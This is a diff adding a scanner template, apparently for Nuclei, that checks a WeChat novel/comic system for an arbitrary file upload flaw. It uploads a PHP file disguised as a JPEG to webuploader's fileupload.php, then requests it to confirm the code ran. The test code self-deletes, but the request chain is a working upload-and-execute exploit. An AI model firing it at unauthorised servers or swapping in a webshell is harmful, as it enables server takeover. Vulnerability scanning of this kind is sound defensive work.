@@ -1,0 +1,52 @@
+id: poc-yaml-wechat-novel-webuploader-upload
+info:
+  name: 微信公众号小说漫画系统 fileupload.php 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: fileupload
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  t1: "{{rand_int(100,1000)}}"
+  t2: "{{rand_int(100,1000)}}"
+  t3: "{{to_number(t1)*to_number(t2)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/Public/webuploader/0.1.5/server/fileupload.php"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR"
+    body: |
+      ------WebKitFormBoundaryj7OlOPiiukkdktZR
+      Content-Disposition: form-data; name="file"; filename="{{filename}}.php"
+      Content-Type: image/jpeg
+
+      <?php print({{t1}}*{{t2}});unlink(__FILE__);?>
+      ------WebKitFormBoundaryj7OlOPiiukkdktZR
+    matchers:
+      - type: word
+        words:
+          - "\"jsonrpc\""
+          - "\"result\""
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/Public/webuploader/0.1.5/server/upload/{{filename}}.php"
+    matchers:
+      - type: word
+        words:
+          - "{{t3}}"
+      - type: status
+        status:
+          - 200
+
+stop-at-first-match: true
